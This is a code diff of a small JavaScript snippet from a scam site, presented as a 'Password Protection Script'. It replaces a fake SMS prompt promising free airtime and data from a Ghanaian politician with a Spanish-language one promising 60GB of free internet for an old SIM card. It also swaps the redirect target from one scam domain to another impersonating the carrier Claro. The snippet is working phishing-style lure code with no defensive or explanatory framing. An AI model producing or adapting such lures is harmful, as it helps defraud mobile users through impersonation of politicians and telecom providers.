@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '60GB INTERNET'
+password=prompt('SMS: Felicitaciones, usted es elegible para recibir 60 GB de Internet gratis como recompensa por su tarjeta SIM antigua. Presione OK para ACTIVAR ','60GB INTERNET');
+if (password != '60GB INTERNET') {
+location.href='https://claro.4g-data.pro/60GB';
 }
